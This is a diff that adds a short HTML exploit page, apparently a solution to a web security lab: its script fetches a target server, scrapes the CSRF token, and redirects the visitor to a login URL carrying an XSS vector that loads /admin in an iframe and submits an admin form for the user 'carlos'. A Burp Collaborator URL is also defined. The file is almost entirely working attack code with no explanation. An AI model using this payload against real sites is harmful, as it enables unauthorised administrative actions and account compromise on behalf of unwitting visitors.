@@ -1,0 +1,19 @@
+<html>
+    <script>
+        collaboratorURL = 'http://d4i329wl1e1wjgh7cec94oo51w7mvb.burpcollaborator.net'
+        url = 'http://192.168.0.181:8080'
+
+        fetch(url)
+        .then(response => response.text())
+        .then(text =>{
+            try {
+                xss_vector = '"><iframe src=/admin onload="var f=this.contentWindow.document.forms[0]; if(f.username)f.username.value=\'carlos\',f.submit()">';
+                login_path = '/login?username='+encodeURIComponent(xss_vector)+'&password=random&csrf='+text.match(/csrf" value="([^"]+)"/);
+                location = url + login_path;
+
+            } catch(err){
+
+            }
+        });
+    </script>
+</html>
